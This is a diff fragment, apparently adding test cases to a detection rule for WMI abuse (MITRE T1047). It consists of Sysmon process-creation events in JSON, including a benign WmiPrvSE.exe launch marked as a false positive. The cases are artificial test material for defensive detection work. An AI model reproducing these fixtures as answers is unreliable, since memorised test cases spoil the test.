+          "user": "karen.metuens",
+          "hash": [
+            "044a0cf1f6bc478a7172bf207eef1e201a18ba02",
+            "097ce5761c89434367598b34fe32893b",
+            "ba4038fd20e474c047be8aad5bfacdb1bfc1ddbe12f803f473b7918d8d819436",
+            "caee994f79d85e47c06e5fa9cdeae453"
+          ]
+        },
+        "ecs": {
+          "version": "1.12.0"
+        },
+        "host": {
+          "id": "d4a1b8f4-baae-4212-b9dd-99aa0716c3e3",
+          "hostname": "wkst02",
+          "os": {
+            "platform": "windows",
+            "type": "windows",
+            "family": "windows",
+            "kernel": "10.0.14393.4770 (rs1_release.211101-1440)",
+            "version": "10.0",
+            "name": "Windows Server 2016 Datacenter",
+            "build": "14393.4770"
+          },
+          "mac": [
+            "06:94:d6:f4:99:d2",
+            "00:00:00:00:00:00:00:e0"
+          ],
+          "name": "wkst02.magnumtempus.financial",
+          "architecture": "x86_64",
+          "ip": [
+            "fe80::cd03:a025:9781:bb37",
+            "172.16.50.131"
+          ]
+        },
+        "hash": {
+          "sha1": "044a0cf1f6bc478a7172bf207eef1e201a18ba02",
+          "sha256": "ba4038fd20e474c047be8aad5bfacdb1bfc1ddbe12f803f473b7918d8d819436",
+          "imphash": "caee994f79d85e47c06e5fa9cdeae453",
+          "md5": "097ce5761c89434367598b34fe32893b"
+        },
+        "rule": {
+          "name": "technique_id=T1047,technique_name=Windows Management Instrumentation"
+        }
+      }
+  - name: False positive
+    result: False
+    event:
+      {
+        "log": {
+          "level": "information"
+        },
+        "user": {
+          "id": "S-1-5-18",
+          "domain": "NT AUTHORITY",
+          "name": "LOCAL SERVICE"
+        },
+        "@timestamp": "2022-02-12T18:22:04.819Z",
+        "message": "Process Create:\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\nUtcTime: 2022-02-12 18:22:04.819\nProcessGuid: {2AA4024F-FACC-6207-272E-000000001702}\nProcessId: 5372\nImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\nFileVersion: 10.0.14393.2155 (rs1_release_1.180305-1842)\nDescription: WMI Provider Host\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Wmiprvse.exe\nCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\LOCAL SERVICE\nLogonGuid: {2AA4024F-875E-61F4-E503-000000000000}\nLogonId: 0x3E5\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA1=57C833DCCF890B8AD092E74A1A730BADEE39E79D,MD5=E1BCE838CD2695999AB34215BF94B501,SHA256=1D7B11C9DEDDAD4F77E5B7F01DDDDA04F3747E512E0AA23D39E4226854D26CA2,IMPHASH=20C3512CFF09FABFB994B8B9DBF73B4F\nParentProcessGuid: {2AA4024F-875D-61F4-0C00-000000001702}\nParentProcessId: 736\nParentImage: C:\\Windows\\System32\\svchost.exe\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k DcomLaunch\nParentUser: NT AUTHORITY\\SYSTEM",
+        "agent": {
+          "id": "53829967-32b6-47b3-9f29-f44d230cb576",
+          "ephemeral_id": "6640f96b-0ec7-4f99-bae4-669d78b779d5",
+          "type": "winlogbeat",
+          "hostname": "dc",
+          "version": "7.16.2",
+          "name": "dc"
+        },
+        "event": {
+          "type": [
+            "start",
+            "process_start"
+          ],
+          "provider": "Microsoft-Windows-Sysmon",
+          "kind": "event",
+          "code": "1",
+          "action": "Process Create (rule: ProcessCreate)",
+          "module": "sysmon",
+          "created": "2022-02-12T18:22:06.434Z",
+          "category": [
+            "process"
+          ]
+        },
+        "tags": [
+          "sysmon",
+          "beats_input_codec_plain_applied"
+        ],
+        "winlog": {
+          "event_data": {
+            "LogonGuid": "{2AA4024F-875E-61F4-E503-000000000000}",
+            "FileVersion": "10.0.14393.2155 (rs1_release_1.180305-1842)",
+            "Product": "Microsoft® Windows® Operating System",
+            "Company": "Microsoft Corporation",
+            "IntegrityLevel": "System",
+            "Description": "WMI Provider Host",
+            "LogonId": "0x3e5",
+            "TerminalSessionId": "0",
+            "ParentUser": "NT AUTHORITY\\SYSTEM"
+          },
+          "user": {
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User",
+            "identifier": "S-1-5-18"
+          },
+          "computer_name": "dc.magnumtempus.financial",
+          "api": "wineventlog",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "opcode": "Info",
+          "task": "Process Create (rule: ProcessCreate)",
+          "record_id": 197612,
+          "version": 5,
+          "process": {
+            "thread": {
+              "id": 2744
+            },
+            "pid": 2180
+          },
+          "provider_name": "Microsoft-Windows-Sysmon"
+        },
+        "@version": "1",
+        "process": {
+          "hash": {
+            "sha1": "57c833dccf890b8ad092e74a1a730badee39e79d",
+            "sha256": "1d7b11c9deddad4f77e5b7f01dddda04f3747e512e0aa23d39e4226854d26ca2",
+            "md5": "e1bce838cd2695999ab34215bf94b501"
+          },
+          "pid": 5372,
+          "command_line": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+          "pe": {
+            "imphash": "20c3512cff09fabfb994b8b9dbf73b4f",
+            "original_file_name": "Wmiprvse.exe",
+            "description": "WMI Provider Host",
+            "company": "Microsoft Corporation",
+            "product": "Microsoft® Windows® Operating System",
+            "file_version": "10.0.14393.2155 (rs1_release_1.180305-1842)"
+          },
+          "entity_id": "{2AA4024F-FACC-6207-272E-000000001702}",
+          "executable": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+          "working_directory": "C:\\Windows\\system32\\",
+          "name": "WmiPrvSE.exe",
+          "parent": {
+            "pid": 736,
+            "entity_id": "{2AA4024F-875D-61F4-0C00-000000001702}",
+            "executable": "C:\\Windows\\System32\\svchost.exe",
+            "name": "svchost.exe",
+            "args": [
+              "C:\\Windows\\system32\\svchost.exe",
+              "-k",
+              "DcomLaunch"
+            ],
+            "command_line": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch"
+          },
+          "args": [
+            "C:\\Windows\\system32\\wbem\\wmiprvse.exe",
+            "-secured",
+            "-Embedding"
+          ]
+        },
+        "related": {
+          "user": "LOCAL SERVICE",
+          "hash": [
+            "57c833dccf890b8ad092e74a1a730badee39e79d",
+            "e1bce838cd2695999ab34215bf94b501",
+            "1d7b11c9deddad4f77e5b7f01dddda04f3747e512e0aa23d39e4226854d26ca2",
+            "20c3512cff09fabfb994b8b9dbf73b4f"
+          ]
+        },
+        "ecs": {
+          "version": "1.12.0"
+        },
+        "host": {
+          "id": "2aa4024f-b2e6-4814-961d-dfd77aff7f0e",
+          "hostname": "dc",
+          "os": {
+            "type": "windows",
+            "platform": "windows",
+            "family": "windows",
+            "kernel": "10.0.14393.4770 (rs1_release.211101-1440)",
+            "version": "10.0",
+            "name": "Windows Server 2016 Datacenter",
+            "build": "14393.4770"
+          },
+          "mac": [
+            "06:fd:33:b7:ca:f8",
+            "00:00:00:00:00:00:00:e0",
+            "00:00:00:00:00:00:00:e0"
+          ],
+          "name": "dc.magnumtempus.financial",
+          "architecture": "x86_64",
+          "ip": [
+            "fe80::d070:550e:4e32:5048",
+            "172.16.50.100",
+            "fe80::5efe:ac10:3264",
+            "fe80::ffff:ffff:fffe"
+          ]
+        },
+        "hash": {
+          "sha1": "57c833dccf890b8ad092e74a1a730badee39e79d",
+          "sha256": "1d7b11c9deddad4f77e5b7f01dddda04f3747e512e0aa23d39e4226854d26ca2",
+          "md5": "e1bce838cd2695999ab34215bf94b501",
+          "imphash": "20c3512cff09fabfb994b8b9dbf73b4f"
+        },
+        "rule": {
+          "name": "technique_id=T1047,technique_name=Windows Management Instrumentation"
+        }
+      }
